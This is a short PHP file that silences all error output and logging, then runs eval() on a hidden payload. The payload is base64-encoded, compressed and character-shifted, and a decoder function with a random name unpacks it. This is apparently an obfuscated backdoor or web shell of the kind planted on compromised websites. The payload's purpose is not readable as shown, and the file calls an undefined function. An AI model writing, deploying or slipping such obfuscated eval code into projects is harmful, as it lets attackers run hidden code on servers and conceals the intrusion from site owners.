<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');

 function PPgpnq($PdxiNd)
{ 
$PdxiNd=gzinflate(base64_decode($PdxiNd));
 for($i=0;$i<strlen($PdxiNd);$i++)
 {
$PdxiNd[$i] = chr(ord($PdxiNd[$i])-1);
 }
 return $PdxiNd;
 }securitas_warning(1);eval(PPgpnq("hVFrS8MwFP0Bhf6HCIO0UPCBijCmjplpZbYj7XwwRqjNXVfM2pKk04H/3bTbQMVHvuRyzsm5594gZI5tgZSlZBKqUuq8yBzCCKUhRe+IsIc+Dfzguq3HfRqRtgrC2B8Qt2tbl3mRMwXawQu9FKy1UtjDB/gry3NViWT9v0DpROq6+l0oyuw7ub+PkgwKrdA8FxqkbXV0hnqok4H2taO0lLBynhMFp8eMQ1pycPDkkb/EE/oSx3crfjRcj44OV0/rkzp5uBX8Jlikg7NVWASv/IaW2HXdrtnUzvhHR0M1qo1snoPgykinttVsGT/LpOAY9c5Rh43DKJ5ukZm3FSxVhs3dCJaglBnItmbdTc90YZzSWgpm1qDbToZpAbOTsmqgdOGhwYSOwnHMKDGTBTHtB9GQUA9pWcPfL5pIQ5+MriIPbcP//SCKRuyeUH/4NCZNi3kiFGw/A94grTXsmegSVFUWCnb5G6p1ctvRWiwVpYJP4MX5Bw=="));


?>